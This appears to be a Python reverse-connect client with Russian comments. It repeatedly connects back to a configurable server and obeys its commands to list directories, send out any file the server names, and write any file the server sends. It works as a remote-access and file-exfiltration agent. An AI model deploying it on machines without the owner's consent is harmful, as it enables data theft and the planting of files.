import socket
import time
import os
import sys
import json

SERVER_HOST = '127.0.0.1'  # ← ЗАМЕНИ НА IP СЕРВЕРА!
SERVER_PORT = 47268
RECONNECT_DELAY = 2

def list_directory(path):
    try:
        if not os.path.exists(path):
            return {"error": "Путь не существует"}
        items = []
        for item in os.listdir(path):
            full = os.path.join(path, item)
            is_dir = os.path.isdir(full)
            size = 0 if is_dir else os.path.getsize(full)
            items.append({"name": item, "is_dir": is_dir, "size": size})
        return {"path": os.path.abspath(path), "items": items}
    except Exception as e:
        return {"error": str(e)}

def start_client():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_HOST, SERVER_PORT))
            print(f"[+] Подключено к {SERVER_HOST}:{SERVER_PORT}")

            while True:
                command = client.recv(4096).decode('utf-8')
                if not command:
                    raise ConnectionError
                if command.strip() == 'exit':
                    print("[!] Сервер завершил работу. Переподключение...")
                    break

                # === UPLOAD: сервер присылает файл → сохраняем
                if command.startswith("UPLOAD:"):
                    _, filename, filesize = command.split(":", 2)
                    filesize = int(filesize)
                    with open(filename, "wb") as f:
                        received = 0
                        while received < filesize:
                            chunk = client.recv(min(4096, filesize - received))
                            if not chunk:
                                break
                            f.write(chunk)
                            received += len(chunk)
                    client.sendall(f"Файл {filename} сохранён".encode('utf-8'))

                # === DOWNLOAD: сервер просит файл → отправляем
                elif command.startswith("DOWNLOAD:"):
                    filepath = command.split(":", 1)[1]
                    if os.path.exists(filepath):
                        filename = os.path.basename(filepath)
                        filesize = os.path.getsize(filepath)
                        client.sendall(f"UPLOAD:{filename}:{filesize}".encode('utf-8'))
                        time.sleep(0.1)
                        with open(filepath, "rb") as f:
                            while True:
                                bytes_read = f.read(4096)
                                if not bytes_read:
                                    break
                                client.sendall(bytes_read)
                    else:
                        client.sendall("ERROR: File not found".encode('utf-8'))

                # === LS: список файлов
                elif command.startswith("LS:"):
                    path = command[3:].strip() or "."
                    result = list_directory(path)
                    client.sendall(json.dumps(result, ensure_ascii=False).encode('utf-8'))

                # === Обычная команда (эхо)
                else:
                    response = f"Команда получена: {command}"
                    client.sendall(response.encode('utf-8'))

        except (ConnectionError, socket.error, OSError) as e:
            print(f"[-] Соединение потеряно: {e}. Переподключение через {RECONNECT_DELAY} сек...")
            client.close()
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    start_client()